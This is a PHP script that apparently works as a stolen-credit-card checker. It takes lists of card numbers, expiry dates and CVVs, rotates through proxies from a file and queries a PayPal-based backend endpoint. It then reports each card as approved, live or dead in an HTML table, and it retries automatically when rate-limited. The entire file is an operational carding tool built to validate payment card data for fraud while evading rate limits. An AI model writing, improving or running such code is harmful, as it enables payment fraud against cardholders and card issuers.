<?php
error_reporting(0);
function value($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function Explicit_Extract($str, $tagIni, $tagEnd)
{
    $arr = explode($tagIni, $str);
    foreach ($arr as $k => $v) {
        $arr[$k] = substr($v, 0, strpos($v, $tagEnd));
    }
    if (empty($arr[0])) {
        unset($arr[0]);
    }
    return $arr[1];
}

function pregMatch($inicio, $final, $conteudo)
{
    preg_match('@' . $inicio . '(.*?)' . $final . '@si', $conteudo, $extract);
    return $extract[1];
}
function data($objeto)
{
    $objeto = explode('-', $objeto);
    $objeto = '' . $objeto[2] . '/' . $objeto[1] . '/' . $objeto[0] . '';
    return $objeto;
}
function percent($num_amount, $num_total)
{
    $count1 = $num_amount / $num_total;
    $count2 = $count1 * 100;
    $count  = number_format($count2, 0);
    return $count;
}

function callAPI($method, $url, $data,$proxy){
    set_time_limit(0);
   $curl = curl_init();

   switch ($method){
      case "POST":
         curl_setopt($curl, CURLOPT_POST, 1);
         if ($data)
            curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
         break;
      case "PUT":
         curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "PUT");
         if ($data)
            curl_setopt($curl, CURLOPT_POSTFIELDS, $data);                              
         break;
      default:
         if ($data)
            $url = sprintf("%s?%s", $url, http_build_query($data));
   }

   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_HTTPHEADER, array(
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) theVALIDccAPI Gecko/20100101 Firefox/72.0'
    ));
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   $result = curl_exec($curl);
   if(!$result){die("Connection Failure");}
   curl_close($curl);
   return $result;
}

if ($_GET['testar'] == "cc") {
    $ccs       = $_GET['ccs'];
    $separador = $_GET['separador'];
    $explode   = explode($separador, $ccs);
    if (substr($explode[0], 0, 1) == '4') {
        $bander = '<font color="#0bbaee"><i class="fa fa-cc-visa" aria-hidden="true"></i></font>';
        $info = 'VISA';
    } elseif (substr($explode[0], 0, 1) == '5') {
        $bander = '<font color="#FF4500"><i class="fa fa-cc-mastercard" aria-hidden="true"></i>';
        $info = 'ECMC';
    } elseif (substr($explode[0], 0, 1) == '3') {
        $bander = '<font color="#137694"><i class="fa fa-cc-amex" aria-hidden="true"></i>';
        $info = 'AMEX';
    } else {
        $bander = '<font color="#ff0000"><i class="fa fa-cc" aria-hidden="true"></font>';
    }
    
    $filename = 'proxies.txt';
    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    $length = count($lines);
    $proxy = $lines[rand(0,$length -1)];
    $ccn = $explode[0];
    $ccm = $explode[1];
    $ccy = $explode[2];
    $cvv = $explode[3];

    /*
    Latest Updated:
    02/01/2021 -
    * If request fails due to too many requests sent, we will wait for a valid response.
    * API end-point has changed.
    */
    ////////////////////////////////////////////////////////////////////////

    for ($x = 1; $x <= 3; $x++) {
        //Do not touch this
        $ch = curl_init();
        $parameters = $ccn . "|" . $ccm . "|" . $ccy . "|" . $cvv;
        $total = 'http://0.0.0.0:8080/paypal.php/?lista=' . $parameters;
        $get_data = file_get_contents($total);
        $reply = json_decode($get_data, true);
        
        //Parse JSON
        $code = $reply['code'];
        $message = $reply['message'];
        
        //If you are sending requests too quickly, we will wait 30 seconds and retry again!
        if($message != "Limited. You are sending requests too quick. Try again in 1 minute.") { break; } else { sleep(45); }
    }
    if($code == "error")
    {
        echo "<tr><td><font size='2'>$bander</font></td>
        <td><font color='#DA514A' size='2'>".$message."</font></td>
        <td><font size='2'>$ccn|$ccm|$ccy|$cvv</font></td>
        <td><font size='2'>".$message."</font></td></tr>";
    } else {
        if($code == "success")
        {
            $type = $reply['type']; //Card Type
            $card = $reply['card']; //Card Inputted
            $status = $reply['status']; //Live - Dead - Etc
            $remaining = $reply['requests_remaining']; //How my req's remaining
            if (strpos($status, 'LIVE') !== false)
            {
                echo "<tr>
                <td><font size='2'>$bander</font></td>
                <td><font color='#1ABE88' size='2'>Approved</font></td>
                <td><font size='2'>$ccn|$ccm|$ccy|$cvv</font></td>
                <td><font size='2'>".$type." - ".$status."</font></td>
                </tr>";
            } else {
				if (strpos($status, 'DEAD') !== false) //Checks for anything that includes "DEAD"
				{
					echo "<tr><td><font size='2'>$bander</font></td>
					<td><font color='#DA514A' size='2'>".$status."</font></td>
					<td><font size='2'>$ccn|$ccm|$ccy|$cvv</font></td>
					<td><font size='2'>".$type."</font></td></tr>";
				} else {
					//Other output
					echo "<tr><td><font size='2'>$bander</font></td>
					<td><font color='#DA514A' size='2'>".$status."</font></td>
					<td><font size='2'>$ccn|$ccm|$ccy|$cvv</font></td>
					<td><font size='2'>".$type."</font></td></tr>";
				}
			}
        }
    }
}

?> 
